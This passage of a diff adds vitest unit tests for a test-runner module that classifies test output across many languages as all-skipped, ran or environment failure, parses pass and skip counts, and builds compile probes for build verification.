@@ -11,7 +11,13 @@ import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
 import fs from 'fs';
 import { readFile } from 'node:fs/promises';
 import {
-  detectTestRunners, detectAutoTestRunners, describeRunnerDirectory, classifyTestExecution,
+  detectTestRunners, detectAutoTestRunners, describeRunnerDirectory,
+  classifySetupFailure, classifyTestExecution, extractTestCoverage,
+  matchesEnvironmentFailureSignature,
+  detectAcceptanceProbes, classifyProbeOutcome, buildWroteNewOutput,
+  isSafeDocumentedCommand, isAllowlistedRunnerShape, discoverDocumentedCommands,
+  MAX_DOCUMENTED_COMMANDS,
+  discoverNewlyDisabledTests, isTestFilePath, MAX_DISABLED_TEST_MARKERS,
 } from './test-runners.js';
 import type { BuildConfig, TestRunner } from './test-runners.js';
 
@@ -251,6 +257,20 @@ describe('detectTestRunners — bare pytest guard (C19)', () => {
     expect(runners).toHaveLength(1);
     expect(runners[0].cmd).toBe('bash');
     expect(runners[0].args).toEqual(['-c', 'go test ./... && go vet ./...']);
+  });
+
+  it('BuildConfig install_cmd is threaded onto the detected runner verbatim', () => {
+    const buildConfig: BuildConfig = {
+      directories: [{
+        path: 'svc',
+        type: 'python',
+        test_cmd: 'python3 -m pytest -x -q',
+        install_cmd: 'python3 -m pip install -e . && python3 -m pip check',
+      }],
+    };
+    const runners = detectTestRunners(buildConfig);
+    expect(runners).toHaveLength(1);
+    expect(runners[0].installCmd).toBe('python3 -m pip install -e . && python3 -m pip check');
   });
 
   it('classifyTestExecution treats Go empty-package output as no_tests', () => {
@@ -1525,9 +1545,343 @@ describe('classifyTestExecution — placeholder/empty suite detection', () => {
     expect(classifyTestExecution('2 passed in 0.50s')).toBe('ran');
   });
 
+  it('missing runtimes do not fall into the placeholder no_tests bucket', () => {
+    expect(classifyTestExecution('bash: python3: command not found')).toBe('ran');
+    expect(classifyTestExecution('zsh: command not found: go')).toBe('ran');
+  });
+
   it('empty / ambiguous output → ran (conservative default)', () => {
     expect(classifyTestExecution('')).toBe('ran');
     expect(classifyTestExecution('some unrelated output')).toBe('ran');
+  });
+});
+
+// All-skipped / fully-skipped runs: the suite COLLECTED tests but executed
+// NONE because every test was skipped/deselected/ignored/filtered (e.g. an
+// integration suite gated on an env var or a service the cold verify VM has not
+// provisioned). This is the SAME honest no-real-tests case as a zero-collection
+// run — it must classify as 'all_skipped' (not 'ran') so the gate does not
+// record a vacuous verified pass. STRICTLY conservative: any run where even one
+// test actually passed or failed stays a real 'ran'.
+describe('classifyTestExecution — all-skipped (no real tests executed)', () => {
+  it('pytest all-skipped banner → all_skipped', () => {
+    expect(classifyTestExecution(
+      'collected 5 items\n\n===== 5 skipped in 0.12s =====',
+    )).toBe('all_skipped');
+  });
+
+  it('pytest all-deselected (-k filter selected nothing) → all_skipped', () => {
+    expect(classifyTestExecution(
+      'collected 5 items / 5 deselected\n\n===== 5 deselected in 0.04s =====',
+    )).toBe('all_skipped');
+  });
+
+  it('vitest all-skipped summary → all_skipped', () => {
+    expect(classifyTestExecution(
+      ' Test Files  1 skipped (1)\n      Tests  5 skipped (5)',
+    )).toBe('all_skipped');
+  });
+
+  it('Rust all-ignored summary → all_skipped', () => {
+    expect(classifyTestExecution([
+      'running 5 tests',
+      'test result: ok. 0 passed; 0 failed; 5 ignored; 0 measured; 0 filtered out',
+    ].join('\n'))).toBe('all_skipped');
+  });
+
+  it('Rust all-filtered-out summary → all_skipped', () => {
+    expect(classifyTestExecution([
+      'running 5 tests',
+      'test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 5 filtered out',
+    ].join('\n'))).toBe('all_skipped');
+  });
+
+  it('Go verbose all-skipped (--- SKIP, no PASS) → all_skipped', () => {
+    expect(classifyTestExecution([
+      '=== RUN   TestIntegration',
+      '    main_test.go:12: requires DATABASE_URL',
+      '--- SKIP: TestIntegration (0.00s)',
+      'ok  \texample.com/pkg\t0.004s',
+    ].join('\n'))).toBe('all_skipped');
+  });
+
+  it('RSpec all-pending (examples == pending) → all_skipped', () => {
+    expect(classifyTestExecution(
+      'Finished in 0.02 seconds\n5 examples, 0 failures, 5 pending',
+    )).toBe('all_skipped');
+  });
+
+  it('Minitest all-skips (runs == skips) → all_skipped', () => {
+    expect(classifyTestExecution(
+      '5 runs, 0 assertions, 0 failures, 0 errors, 5 skips',
+    )).toBe('all_skipped');
+  });
+
+  it('Elixir ExUnit all-excluded (tests == excluded) → all_skipped', () => {
+    expect(classifyTestExecution(
+      'Finished in 0.1 seconds\n5 tests, 0 failures, 5 excluded',
+    )).toBe('all_skipped');
+  });
+
+  it('Gradle/Maven Surefire all-skipped (Tests run == Skipped) → all_skipped', () => {
+    expect(classifyTestExecution(
+      'Tests run: 5, Failures: 0, Errors: 0, Skipped: 5',
+    )).toBe('all_skipped');
+  });
+
+  it('.NET all-skipped (Total == Skipped) → all_skipped', () => {
+    expect(classifyTestExecution(
+      'Passed!  - Failed: 0, Passed: 0, Skipped: 5, Total: 5, Duration: 1 ms',
+    )).toBe('all_skipped');
+  });
+
+  it('PHPUnit all-skipped (Tests == Skipped) → all_skipped', () => {
+    expect(classifyTestExecution(
+      'OK, but incomplete, skipped, or risky tests!\nTests: 5, Assertions: 0, Skipped: 5.',
+    )).toBe('all_skipped');
+  });
+
+  // ── Conservative invariant: any real pass/fail keeps it a real 'ran' ──
+  it('pytest mixed pass-with-skips ("5 passed, 1500 skipped") → ran', () => {
+    expect(classifyTestExecution(
+      '===== 5 passed, 1500 skipped in 4.20s =====',
+    )).toBe('ran');
+  });
+
+  it('Rust mixed pass-with-ignored ("3 passed; .. 5 ignored") → ran', () => {
+    expect(classifyTestExecution([
+      'running 8 tests',
+      'test result: ok. 3 passed; 0 failed; 5 ignored; 0 measured; 0 filtered out',
+    ].join('\n'))).toBe('ran');
+  });
+
+  it('Maven mixed (Tests run 5, Skipped 3 → 2 passed) → ran', () => {
+    expect(classifyTestExecution(
+      'Tests run: 5, Failures: 0, Errors: 0, Skipped: 3',
+    )).toBe('ran');
+  });
+
+  it('RSpec mixed (5 examples, 3 pending → 2 passed) → ran', () => {
+    expect(classifyTestExecution(
+      '5 examples, 0 failures, 3 pending',
+    )).toBe('ran');
+  });
+
+  it('all-skipped with a real failure present → ran (failure wins)', () => {
+    expect(classifyTestExecution(
+      'FAILED test_x.py::test_a - AssertionError\n1 failed, 5 skipped in 0.30s',
+    )).toBe('ran');
+  });
+
+  // A test that merely QUOTES a skip phrase as assertion data is a real run.
+  it('failing test asserting on literal "5 skipped" → ran', () => {
+    expect(classifyTestExecution(
+      "FAILED test_report.py::test_summary - AssertionError: expected '5 skipped' in output\n1 failed in 0.05s",
+    )).toBe('ran');
+  });
+
+  it('passing test asserting on literal "Skipped: 5" → ran (real pass present)', () => {
+    expect(classifyTestExecution(
+      "test_report.py::test_summary - assert 'Skipped: 5' in out\n1 passed in 0.05s",
+    )).toBe('ran');
+  });
+
+  // Multi-class / multi-project guard: aggregate families (Maven/Surefire/
+  // Gradle, dotnet test) print ONE summary line PER class/project. A single
+  // fully-skipped class must NOT short-circuit the scan and flip a run with
+  // passing sibling classes to all_skipped. Surefire emits no "N passed" token,
+  // so the total > skip pass-evidence guard (not hasRealPassEvidence) is what
+  // keeps the run real here.
+  it('Maven multi-class (one all-skip class, sibling passing class) → ran', () => {
+    expect(classifyTestExecution([
+      'Running com.example.FooTest',
+      'Tests run: 3, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.042 s',
+      'Running com.example.BarTest',
+      'Tests run: 2, Failures: 0, Errors: 0, Skipped: 2, Time elapsed: 0.001 s',
+      '',
+      'Results:',
+      '',
+      'Tests run: 5, Failures: 0, Errors: 0, Skipped: 2',
+    ].join('\n'))).toBe('ran');
+  });
+
+  it('Maven every class fully skipped (no passing sibling) → all_skipped', () => {
+    expect(classifyTestExecution([
+      'Tests run: 2, Failures: 0, Errors: 0, Skipped: 2',
+      'Tests run: 3, Failures: 0, Errors: 0, Skipped: 3',
+      'Results:',
+      'Tests run: 5, Failures: 0, Errors: 0, Skipped: 5',
+    ].join('\n'))).toBe('all_skipped');
+  });
+
+  it('.NET multi-project (one all-skip project, sibling passing project) → ran', () => {
+    expect(classifyTestExecution([
+      'Passed!  - Failed:     0, Passed:     3, Skipped:     0, Total:     3  - FooProj.dll',
+      'Passed!  - Failed:     0, Passed:     0, Skipped:     2, Total:     2  - BarProj.dll',
+    ].join('\n'))).toBe('ran');
+  });
+});
+
+// extractTestCoverage parses best-effort pass/skip/total counts from runner
+// output so a green PASS that ran only a tiny fraction of its suite ("5 passed,
+// 1500 skipped") is no longer indistinguishable from a fully exercised pass. It
+// reuses the SAME token/regex families classifyTestExecution understands and is
+// CONSERVATIVE: ambiguous / unparseable output returns null.
+describe('extractTestCoverage — pass/skip/total parsing', () => {
+  describe('standalone-token families (partial skip)', () => {
+    it('pytest "5 passed, 1500 skipped" → {5, 1500, 1505}', () => {
+      expect(extractTestCoverage('===== 5 passed, 1500 skipped in 3.45s =====')).toEqual({
+        passed: 5, skipped: 1500, total: 1505,
+      });
+    });
+
+    it('pytest deselected counted as skipped', () => {
+      expect(extractTestCoverage('===== 1 passed, 4 deselected in 0.10s =====')).toEqual({
+        passed: 1, skipped: 4, total: 5,
+      });
+    });
+
+    it('vitest summary ignores the Test Files line (no double count)', () => {
+      expect(extractTestCoverage([
+        ' Test Files  1 passed (1)',
+        '      Tests  5 passed | 1500 skipped (1505)',
+      ].join('\n'))).toEqual({ passed: 5, skipped: 1500, total: 1505 });
+    });
+
+    it('Rust ignored + filtered out both counted as skipped', () => {
+      expect(extractTestCoverage(
+        'test result: ok. 5 passed; 0 failed; 3 ignored; 0 measured; 1 filtered out; finished',
+      )).toEqual({ passed: 5, skipped: 4, total: 9 });
+    });
+
+    it('Go verbose --- PASS:/--- SKIP: markers are tallied', () => {
+      expect(extractTestCoverage([
+        '--- PASS: TestAlpha (0.00s)',
+        '--- PASS: TestBeta (0.00s)',
+        '--- SKIP: TestGamma (0.00s)',
+        'PASS',
+        'ok  example.com/pkg 0.012s',
+      ].join('\n'))).toEqual({ passed: 2, skipped: 1, total: 3 });
+    });
+  });
+
+  describe('aggregate families (single summary line)', () => {
+    it('RSpec examples/pending → derives passed from total', () => {
+      expect(extractTestCoverage('5 examples, 0 failures, 3 pending')).toEqual({
+        passed: 2, skipped: 3, total: 5,
+      });
+    });
+
+    it('Minitest runs/skips', () => {
+      expect(extractTestCoverage('5 runs, 12 assertions, 0 failures, 0 errors, 2 skips')).toEqual({
+        passed: 3, skipped: 2, total: 5,
+      });
+    });
+
+    it('ExUnit tests/skipped', () => {
+      expect(extractTestCoverage('5 tests, 0 failures, 2 skipped')).toEqual({
+        passed: 3, skipped: 2, total: 5,
+      });
+    });
+
+    it('ExUnit excluded counted as skipped', () => {
+      expect(extractTestCoverage('5 tests, 0 failures, 4 excluded')).toEqual({
+        passed: 1, skipped: 4, total: 5,
+      });
+    });
+
+    it('Surefire/Maven "Tests run:"/"Skipped:" (minus failures)', () => {
+      expect(extractTestCoverage('Tests run: 5, Failures: 1, Errors: 0, Skipped: 2')).toEqual({
+        passed: 2, skipped: 2, total: 5,
+      });
+    });
+
+    it('.NET "Total:"/"Skipped:"', () => {
+      expect(extractTestCoverage('Passed!  - Failed: 0, Passed: 0, Skipped: 5, Total: 5')).toEqual({
+        passed: 0, skipped: 5, total: 5,
+      });
+    });
+
+    it('PHPUnit "Tests:"/"Skipped:"', () => {
+      expect(extractTestCoverage('Tests: 5, Assertions: 12, Failures: 1, Skipped: 2')).toEqual({
+        passed: 2, skipped: 2, total: 5,
+      });
+    });
+  });
+
+  describe('fully-exercised runs (zero skipped)', () => {
+    it('pytest all-pass → skipped 0', () => {
+      expect(extractTestCoverage('===== 42 passed in 1.20s =====')).toEqual({
+        passed: 42, skipped: 0, total: 42,
+      });
+    });
+
+    it('Surefire all-pass → skipped 0', () => {
+      expect(extractTestCoverage('Tests run: 8, Failures: 0, Errors: 0, Skipped: 0')).toEqual({
+        passed: 8, skipped: 0, total: 8,
+      });
+    });
+  });
+
+  describe('multi-class / multi-project summation', () => {
+    it('sums Surefire counts across two class summaries', () => {
+      expect(extractTestCoverage([
+        'Tests run: 3, Failures: 0, Errors: 0, Skipped: 0',
+        'Tests run: 2, Failures: 0, Errors: 0, Skipped: 2',
+      ].join('\n'))).toEqual({ passed: 3, skipped: 2, total: 5 });
+    });
+  });
+
+  describe('unparseable / ambiguous output → null', () => {
+    it('empty string → null', () => {
+      expect(extractTestCoverage('')).toBeNull();
+    });
+
+    it('no recognizable count tokens → null', () => {
+      expect(extractTestCoverage('some unrelated build log\nDone.')).toBeNull();
+    });
+
+    it('Go non-verbose pass (no counts) → null', () => {
+      expect(extractTestCoverage('ok  example.com/pkg 0.5s')).toBeNull();
+    });
+
+    it('inconsistent aggregate (skipped > total) → null', () => {
+      expect(extractTestCoverage('Tests run: 2, Failures: 0, Errors: 0, Skipped: 5')).toBeNull();
+    });
+  });
+});
+
+describe('classifySetupFailure — bootstrap/setup infrastructure detection', () => {
+  it('detects missing runtimes and package-manager tools via line-anchored command-not-found output', () => {
+    expect(classifySetupFailure('bash: python3: command not found')).toBe(true);
+    expect(classifySetupFailure('sh: line 1: cargo: command not found')).toBe(true);
+    expect(classifySetupFailure('zsh: command not found: node')).toBe(true);
+    expect(classifySetupFailure('bash: pip: command not found')).toBe(true);
+  });
+
+  it('treats missing pip itself as setup, but generic repo dependency imports as real failures', () => {
+    expect(classifySetupFailure("ModuleNotFoundError: No module named 'pip'")).toBe(true);
+    expect(classifySetupFailure("ImportError: No module named 'pip'")).toBe(true);
+    expect(classifySetupFailure("ModuleNotFoundError: No module named 'sqlalchemy'")).toBe(false);
+    expect(classifySetupFailure("ImportError: No module named 'requests'")).toBe(false);
+    expect(classifySetupFailure("ImportError: cannot import name 'foo' from 'bar'")).toBe(false);
+  });
+
+  it('does not treat repo dependency/module resolution failures as setup infra', () => {
+    expect(classifySetupFailure('cannot find package "github.com/acme/lib" in any of:')).toBe(false);
+    expect(classifySetupFailure('no required module provides package github.com/acme/lib; to add it:')).toBe(false);
+    expect(classifySetupFailure('missing go.sum entry for module providing package github.com/acme/lib')).toBe(false);
+    expect(classifySetupFailure("Error: Cannot find module 'typescript'")).toBe(false);
+    expect(classifySetupFailure("Cannot find module '@acme/tooling' from '/tmp/workspace'")).toBe(false);
+    expect(classifySetupFailure("Error: Cannot find module './local-helper'")).toBe(false);
+  });
+
+  it('does not misclassify quoted setup-like text inside a real failure', () => {
+    expect(
+      classifySetupFailure(
+        "FAILED test_cli.py::test_help - AssertionError: expected \"bash: python3: command not found\" in stderr",
+      ),
+    ).toBe(false);
   });
 });
 
@@ -1600,5 +1954,966 @@ describe('classifyTestExecution — extra-family real-failure guard', () => {
     expect(classifyTestExecution(
       'bash: mix: command not found\n0 tests, 0 failures',
     )).toBe('no_tests');
+  });
+});
+
+describe('matchesEnvironmentFailureSignature — env/setup failure detection', () => {
+  // ── True cases: env signals without real test failure evidence ──────────────
+
+  it('cannot open shared object file (.so) → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory',
+    )).toBe(true);
+  });
+
+  it('error while loading shared libraries → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'error while loading shared librar: libfoo.so: no such file',
+    )).toBe(true);
+  });
+
+  it('no such file or directory for .so → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'No such file or directory: libpq.so.5',
+    )).toBe(true);
+  });
+
+  it('spawn ENOENT → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'Error: spawn /usr/bin/pytest ENOENT',
+    )).toBe(true);
+  });
+
+  it('node: command not found (VM-level) → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'node: command not found',
+    )).toBe(true);
+  });
+
+  it('python3: command not found (VM-level) → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'python3: command not found',
+    )).toBe(true);
+  });
+
+  // ── False cases: repo dependency failures and real test-failure evidence stay red ──
+
+  it('bare ModuleNotFoundError from the suite is not treated as VM infra', () => {
+    expect(matchesEnvironmentFailureSignature(
+      "ModuleNotFoundError: No module named 'pytest'",
+    )).toBe(false);
+  });
+
+  it('bare ImportError: No module named is not treated as VM infra', () => {
+    expect(matchesEnvironmentFailureSignature(
+      "ImportError: No module named 'yaml'",
+    )).toBe(false);
+  });
+
+  it('bare Cannot find module is not treated as VM infra', () => {
+    expect(matchesEnvironmentFailureSignature(
+      "Error: Cannot find module 'typescript'",
+    )).toBe(false);
+  });
+
+  it('FAILED line + ModuleNotFoundError → false (real test failure, not env)', () => {
+    expect(matchesEnvironmentFailureSignature(
+      "FAILED test_api.py::test_get - ModuleNotFoundError: No module named 'requests'\n1 failed in 0.01s",
+    )).toBe(false);
+  });
+
+  it('1 failed count + .so error → false (real test failure quotes env phrase)', () => {
+    expect(matchesEnvironmentFailureSignature(
+      "test_loader.py::test_lib - AssertionError: expected 'cannot open shared object file'\n1 failed in 0.03s",
+    )).toBe(false);
+  });
+
+  it('Go --- FAIL: line + env phrase → false', () => {
+    expect(matchesEnvironmentFailureSignature(
+      '--- FAIL: TestLoadLib (0.01s)\n    lib_test.go:12: error while loading shared librar: libfoo.so\nFAIL',
+    )).toBe(false);
+  });
+
+  it('.NET Failed: 1 + env phrase → false', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'ModuleNotFoundError: No module named foo\nFailed!  - Failed:     1, Passed:     0',
+    )).toBe(false);
+  });
+
+  // ── Edge cases ──────────────────────────────────────────────────────────────
+
+  it('empty string → false', () => {
+    expect(matchesEnvironmentFailureSignature('')).toBe(false);
+  });
+
+  it('plain test failure with no env phrase → false', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'FAILED test_foo.py::test_bar - AssertionError: 1 != 2\n1 failed in 0.05s',
+    )).toBe(false);
+  });
+
+  it('passing output → false', () => {
+    expect(matchesEnvironmentFailureSignature('2 passed in 0.50s')).toBe(false);
+  });
+
+  it('missing-system-librar phrase → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'missing required system library: libgomp.so',
+    )).toBe(true);
+  });
+
+  // ── dash/sh "<tool>: not found" missing-executable phrasing ─────────────────
+
+  it("Debian dash '/bin/sh: 1: pytest: not found' → true", () => {
+    expect(matchesEnvironmentFailureSignature(
+      '/bin/sh: 1: pytest: not found',
+    )).toBe(true);
+  });
+
+  it("sh '<tool>: not found' without line number → true", () => {
+    expect(matchesEnvironmentFailureSignature(
+      'sh: rspec: not found',
+    )).toBe(true);
+  });
+
+  it("repo dependency 'No module named' (not shell-prefixed) stays red", () => {
+    expect(matchesEnvironmentFailureSignature(
+      "ImportError: No module named 'requests' — not found in site-packages",
+    )).toBe(false);
+  });
+
+  // ── Docker daemon unavailable on the gate VM ────────────────────────────────
+
+  it('cannot connect to the Docker daemon → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?',
+    )).toBe(true);
+  });
+
+  // ── Out-of-memory kills (exit 137 / SIGKILL / signal 9) ─────────────────────
+
+  it("bare 'Killed' line → true (OOM killer)", () => {
+    expect(matchesEnvironmentFailureSignature(
+      'npm test\nKilled',
+    )).toBe(true);
+  });
+
+  it("Go 'signal: killed' → true", () => {
+    expect(matchesEnvironmentFailureSignature(
+      'go test ./...\nsignal: killed',
+    )).toBe(true);
+  });
+
+  it('exit code 137 → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'Command failed with exit code 137',
+    )).toBe(true);
+  });
+
+  it('JavaScript heap out of memory → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory',
+    )).toBe(true);
+  });
+
+  it('OOM phrase + real FAILED line → false (real test failure quotes env phrase)', () => {
+    expect(matchesEnvironmentFailureSignature(
+      "FAILED test_oom.py::test_msg - AssertionError: expected 'out of memory: kill'\n1 failed in 0.02s",
+    )).toBe(false);
+  });
+
+  // ── Disk/quota/space failures (host resource exhaustion on the gate VM) ──────
+
+  it('no space left on device → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'write error: No space left on device',
+    )).toBe(true);
+  });
+
+  it('disk quota exceeded → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'Error: EDQUOT: disk quota exceeded, write',
+    )).toBe(true);
+  });
+
+  it('filesystem is full → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'Filesystem is full, cannot write to /tmp',
+    )).toBe(true);
+  });
+
+  it('ENOSPC error code → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'ENOSPC: no space left on device, write',
+    )).toBe(true);
+  });
+
+  // ── Permission denied / access failures (insufficient perms, read-only fs) ────
+
+  it('permission denied → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'Error: EACCES: permission denied, open /tmp/test.log',
+    )).toBe(true);
+  });
+
+  it('permission denied without error code → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'fatal: Permission denied (publickey)',
+    )).toBe(true);
+  });
+
+  it('EACCES error code → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'EACCES: permission denied when reading file',
+    )).toBe(true);
+  });
+
+  it('read-only file system → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'Error: EROFS: read-only file system, write',
+    )).toBe(true);
+  });
+
+  it('read-only file system phrase → true', () => {
+    expect(matchesEnvironmentFailureSignature(
+      'mount: read-only file system',
+    )).toBe(true);
+  });
+
+  it('disk full + real FAILED line → false (real test failure quotes env phrase)', () => {
+    expect(matchesEnvironmentFailureSignature(
+      "FAILED test_disk.py::test_write - AssertionError: 'no space left on device'\n1 failed in 0.01s",
+    )).toBe(false);
+  });
+
+  it('permission denied + real error count → false (real test failure)', () => {
+    expect(matchesEnvironmentFailureSignature(
+      "test_access.py::test_file - OSError: permission denied\n1 failed in 0.02s",
+    )).toBe(false);
+  });
+});
+
+// ── buildWroteNewOutput (no-op declared-build detection) ─────────────────────
+describe('buildWroteNewOutput', () => {
+  it('returns false when before and after snapshots are identical (no-op build)', () => {
+    const snap = '!! node_modules/\n!! .vitest_cache/\n';
+    expect(buildWroteNewOutput(snap, snap)).toBe(false);
+  });
+
+  it('returns false for two empty snapshots (clean tree, nothing written)', () => {
+    expect(buildWroteNewOutput('', '')).toBe(false);
+  });
+
+  it('returns true when after introduces a new untracked artifact', () => {
+    const before = '!! node_modules/\n';
+    const after = '!! node_modules/\n?? dist/bundle.js\n';
+    expect(buildWroteNewOutput(before, after)).toBe(true);
+  });
+
+  it('returns true when after modifies a tracked file', () => {
+    expect(buildWroteNewOutput('', ' M src/generated.ts\n')).toBe(true);
+  });
+
+  it('ignores pre-existing warm-VM cache dirs present in both snapshots', () => {
+    // node_modules / .pnpm-store survive `git clean -fdx` and show up in BOTH
+    // snapshots — a diff must not count them as fresh build output.
+    const before = '!! node_modules/\n!! .pnpm-store/\n!! .testmondata\n';
+    const after = '!! .pnpm-store/\n!! node_modules/\n!! .testmondata\n';
+    expect(buildWroteNewOutput(before, after)).toBe(false);
+  });
+
+  it('tolerates CRLF line endings and blank lines', () => {
+    expect(buildWroteNewOutput('!! a\r\n\r\n', '!! a\r\n')).toBe(false);
+    expect(buildWroteNewOutput('!! a\r\n', '!! a\r\n?? b\r\n')).toBe(true);
+  });
+});
+
+// ── detectAcceptanceProbes ───────────────────────────────────────────────────
+describe('detectAcceptanceProbes', () => {
+  beforeEach(() => {
+    mockFs.existsSync.mockReset();
+    mockFs.readFileSync.mockReset();
+    mockFs.readdirSync.mockReset();
+    mockFs.existsSync.mockReturnValue(false);
+    mockFs.readFileSync.mockReturnValue('');
+    mockFs.readdirSync.mockReturnValue([]);
+  });
+
+  it('build_config python directory → compileall probe (type hint, no manifest needed)', () => {
+    const probes = detectAcceptanceProbes({
+      directories: [{ path: 'backend', type: 'python', test_cmd: 'pytest' }],
+    } as BuildConfig);
+    const py = probes.find(p => p.ecosystem === 'python');
+    expect(py).toBeDefined();
+    expect(py?.cmd).toBe('python3');
+    expect(py?.args.slice(0, 3)).toEqual(['-m', 'compileall', '-q']);
+    expect(py?.args.at(-1)).toBe(`${WORKSPACE}/backend`);
+    expect(py?.cwd).toBe(`${WORKSPACE}/backend`);
+  });
+
+  it('tsconfig.json present → tsc --noEmit probe (no-install)', () => {
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/tsconfig.json`);
+    const probes = detectAcceptanceProbes(undefined);
+    const node = probes.find(p => p.ecosystem === 'node');
+    expect(node).toBeDefined();
+    expect(node?.cmd).toBe('npx');
+    expect(node?.args).toEqual(['--no-install', 'tsc', '--noEmit']);
+  });
+
+  it('go.mod present → go build ./... probe', () => {
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/go.mod`);
+    const probes = detectAcceptanceProbes(undefined);
+    const go = probes.find(p => p.ecosystem === 'go');
+    expect(go).toEqual(expect.objectContaining({ cmd: 'go', args: ['build', './...'], cwd: WORKSPACE }));
+  });
+
+  it('Cargo.toml present → cargo check probe', () => {
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/Cargo.toml`);
+    const probes = detectAcceptanceProbes(undefined);
+    const rust = probes.find(p => p.ecosystem === 'rust');
+    expect(rust).toEqual(expect.objectContaining({ cmd: 'cargo', args: ['check', '--quiet'], cwd: WORKSPACE }));
+  });
+
+  it('*.csproj present → dotnet build probe (glob-detected)', () => {
+    mockFs.readdirSync.mockImplementation((p: string) =>
+      p === WORKSPACE ? ['App.csproj', 'Program.cs'] : [],
+    );
+    const probes = detectAcceptanceProbes(undefined);
+    const dotnet = probes.find(p => p.ecosystem === 'dotnet');
+    expect(dotnet).toEqual(expect.objectContaining({ cmd: 'dotnet', args: ['build', '--nologo'], cwd: WORKSPACE }));
+  });
+
+  it('*.sln present → dotnet build probe (glob-detected)', () => {
+    mockFs.readdirSync.mockImplementation((p: string) => (p === WORKSPACE ? ['Solution.sln'] : []));
+    const probes = detectAcceptanceProbes(undefined);
+    expect(probes.find(p => p.ecosystem === 'dotnet')?.cmd).toBe('dotnet');
+  });
+
+  it('build.gradle present → gradlew classes probe (compile-only)', () => {
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/build.gradle`);
+    const probes = detectAcceptanceProbes(undefined);
+    const gradle = probes.find(p => p.ecosystem === 'gradle');
+    expect(gradle).toEqual(expect.objectContaining({ cmd: './gradlew', args: ['classes', '--no-daemon'], cwd: WORKSPACE }));
+  });
+
+  it('build.gradle.kts present → gradlew classes probe (Kotlin DSL)', () => {
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/build.gradle.kts`);
+    const probes = detectAcceptanceProbes(undefined);
+    expect(probes.find(p => p.ecosystem === 'gradle')?.cmd).toBe('./gradlew');
+  });
+
+  it('pom.xml present → mvn offline test-compile probe', () => {
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/pom.xml`);
+    const probes = detectAcceptanceProbes(undefined);
+    const maven = probes.find(p => p.ecosystem === 'maven');
+    expect(maven).toEqual(expect.objectContaining({ cmd: 'mvn', args: ['-o', '-B', 'test-compile'], cwd: WORKSPACE }));
+  });
+
+  it('mix.exs present → mix compile probe', () => {
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/mix.exs`);
+    const probes = detectAcceptanceProbes(undefined);
+    const elixir = probes.find(p => p.ecosystem === 'elixir');
+    expect(elixir).toEqual(expect.objectContaining({ cmd: 'mix', args: ['compile'], cwd: WORKSPACE }));
+  });
+
+  it('plain-JS package (package.json, no tsconfig) → no node probe (nothing cheap+safe to compile)', () => {
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/package.json`);
+    const probes = detectAcceptanceProbes(undefined);
+    expect(probes.find(p => p.ecosystem === 'node')).toBeUndefined();
+  });
+
+  it('bare repo with no recognized manifests → no probes', () => {
+    expect(detectAcceptanceProbes(undefined)).toEqual([]);
+  });
+
+  it('deduplicates by ecosystem:cwd across build_config + auto-scan', () => {
+    // build_config declares root python; auto-detect would also see pyproject at root.
+    mockFs.existsSync.mockImplementation((p: string) => p === `${WORKSPACE}/pyproject.toml`);
+    const probes = detectAcceptanceProbes({
+      directories: [{ path: '', type: 'python', test_cmd: 'pytest' }],
+    } as BuildConfig);
+    expect(probes.filter(p => p.ecosystem === 'python' && p.cwd === WORKSPACE)).toHaveLength(1);
+  });
+
+  // ── declared build_cmd probes ──────────────────────────────────────────────
+  it('build_config dir with build_cmd → declared probe (plain command tokenized)', () => {
+    const probes = detectAcceptanceProbes({
+      directories: [{ path: 'admin-ui', type: 'node', build_cmd: 'npm run build' }],
+    } as BuildConfig);
+    const declared = probes.find(p => p.declared);
+    expect(declared).toBeDefined();
+    expect(declared?.cmd).toBe('npm');
+    expect(declared?.args).toEqual(['run', 'build']);
+    expect(declared?.cwd).toBe(`${WORKSPACE}/admin-ui`);
+    expect(declared?.ecosystem).toBe('node');
+    expect(declared?.label).toBe('npm run build (admin-ui)');
+  });
+
+  it('build_cmd with shell operators → bash -c wrapped declared probe', () => {
+    const probes = detectAcceptanceProbes({
+      directories: [{ path: '', type: 'rust', build_cmd: 'make && cargo build --features x' }],
+    } as BuildConfig);
+    const declared = probes.find(p => p.declared);
+    expect(declared).toBeDefined();
+    expect(declared?.cmd).toBe('bash');
+    expect(declared?.args).toEqual(['-c', 'make && cargo build --features x']);
+    expect(declared?.cwd).toBe(WORKSPACE);
+    expect(declared?.label).toBe('make && cargo build --features x (root)');
+  });
+
+  it('build_cmd on a dir type without a language bucket → ecosystem "build"', () => {
+    const probes = detectAcceptanceProbes({
